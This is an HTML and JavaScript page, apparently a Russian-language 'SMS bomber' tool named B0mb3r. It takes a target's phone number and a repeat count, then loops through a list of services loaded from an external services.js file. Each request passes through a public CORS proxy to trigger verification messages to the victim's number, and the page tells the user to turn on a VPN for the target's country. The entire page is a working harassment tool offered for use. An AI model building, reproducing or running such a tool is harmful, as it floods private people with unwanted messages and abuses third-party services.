<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>B0mb3r TG</title>
    <style>
        :root {
            --bg: #0d1117; --card: #161b22; --brd: #30363d;
            --red: #d32f2f; --green: #238636; --txt: #c9d1d9; --dim: #8b949e;
        }
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; outline: none; }
        body { background: var(--bg); color: var(--txt); font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .main { text-align: center; width: 100%; max-width: 300px; padding: 20px; }
        .logo { font-size: 32px; font-weight: bold; margin-bottom: 5px; }
        .status-vpn { font-size: 11px; color: var(--green); margin-bottom: 20px; padding: 5px; border: 1px dashed var(--green); border-radius: 5px; }
        .row { display: flex; gap: 8px; margin-bottom: 15px; }
        .input-box { display: flex; background: var(--card); border: 1px solid var(--brd); border-radius: 8px; flex: 1; align-items: center; }
        .sel { padding: 12px; cursor: pointer; display: flex; align-items: center; gap: 5px; border-right: 1px solid var(--brd); }
        .phone { background: transparent; border: none; color: #fff; padding: 12px; width: 100%; font-size: 14px; }
        .loops { background: var(--card); border: 1px solid var(--brd); border-radius: 8px; width: 50px; color: #fff; text-align: center; }
        .btn { background: var(--red); color: #fff; border: none; border-radius: 8px; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; }
        .btn:active { opacity: 0.8; }
        
        /* Loader */
        .loader { position: fixed; inset: 0; background: rgba(13,17,23,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
        .spinner { width: 40px; height: 40px; border: 4px solid #30363d; border-top-color: var(--red); border-radius: 50%; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }

        /* Drawer */
        .drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: var(--card); border-top: 1px solid var(--brd); border-radius: 20px 20px 0 0; transition: 0.3s; z-index: 1100; padding: 20px; }
        .drawer.active { bottom: 0; }
        .d-item { padding: 15px; border-bottom: 1px solid var(--brd); display: flex; justify-content: space-between; cursor: pointer; }
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); display: none; z-index: 1050; }
    </style>
</head>
<body>
    <div class="overlay" id="overlay"></div>
    <div class="loader" id="loader">
        <div class="spinner"></div>
        <p id="p-stats" style="margin-top:15px; font-weight:bold;">Отправка...</p>
        <p id="p-name" style="color:var(--dim); font-size:12px;"></p>
    </div>

    <div class="main">
        <div class="logo">B0MB3R 💣</div>
        <div class="status-vpn">VPN: Пользовательский (Включите VPN страны цели)</div>
        
        <form id="bForm">
            <div class="row">
                <div class="input-box">
                    <div class="sel" id="cTrig">
                        <img id="cFlag" src="https://purecatamphetamine.github.io/country-flag-icons/3x2/RU.svg" width="18">
                        <span id="cCode">+7</span>
                    </div>
                    <input type="tel" class="phone" id="phone" placeholder="9000000000" required>
                </div>
                <input type="number" id="loops" class="loops" value="1" min="1" max="10">
            </div>
            <button type="submit" class="btn">ЗАПУСТИТЬ</button>
        </form>
        <p style="color:var(--dim); font-size: 11px; margin-top: 15px;">Сервисов в базе: <span id="sCount">0</span></p>
    </div>

    <div class="drawer" id="drawer">
        <div class="d-item" onclick="setCountry('RU','+7','9000000000')"><span>🇷🇺 Россия</span><span>+7</span></div>
        <div class="d-item" onclick="setCountry('UA','+380','500000000')"><span>🇺🇦 Украина</span><span>+380</span></div>
        <div class="d-item" onclick="setCountry('BY','+375','290000000')"><span>🇧🇾 Беларусь</span><span>+375</span></div>
        <div class="d-item" onclick="setCountry('KZ','+7','7000000000')"><span>🇰🇿 Казахстан</span><span>+7</span></div>
    </div>

    <script src="services.js"></script>
    <script>
        const proxy = "https://corsproxy.io/?";
        const trig = document.getElementById('cTrig');
        const drw = document.getElementById('drawer');
        const ovl = document.getElementById('overlay');

        window.onload = () => { document.getElementById('sCount').innerText = SERVICES.length; };

        trig.onclick = () => { drw.classList.add('active'); ovl.style.display = 'block'; };
        ovl.onclick = () => { drw.classList.remove('active'); ovl.style.display = 'none'; };

        function setCountry(iso, code, ph) {
            document.getElementById('cFlag').src = `https://purecatamphetamine.github.io/country-flag-icons/3x2/${iso}.svg`;
            document.getElementById('cCode').innerText = code;
            document.getElementById('phone').placeholder = ph;
            drw.classList.remove('active'); ovl.style.display = 'none';
        }

        document.getElementById('bForm').onsubmit = async (e) => {
            e.preventDefault();
            const fullPhone = document.getElementById('cCode').innerText.replace('+', '') + document.getElementById('phone').value;
            const loops = document.getElementById('loops').value;
            const loader = document.getElementById('loader');
            const pStats = document.getElementById('p-stats');
            const pName = document.getElementById('p-name');

            loader.style.display = 'flex';
            let count = 0;

            for (let l = 0; l < loops; l++) {
                for (const s of SERVICES) {
                    pName.innerText = `Сервис: ${s.name}`;
                    pStats.innerText = `Круг ${l+1} | Отправлено: ${++count}`;
                    
                    try {
                        let target = typeof s.url === 'function' ? s.url(fullPhone) : s.url;
                        let final = proxy + encodeURIComponent(target);
                        let opt = { method: s.method };
                        if (s.json) { 
                            opt.headers = { 'Content-Type': 'application/json' };
                            opt.body = JSON.stringify(s.json(fullPhone));
                        }
                        if (s.form) {
                            opt.body = new URLSearchParams(s.form(fullPhone));
                        }
                        fetch(final, opt);
                    } catch(e) {}
                    await new Promise(r => setTimeout(r, 60));
                }
            }
            loader.style.display = 'none';
            alert("Готово! Проверьте результат.");
        };
    </script>
</body>
</html>
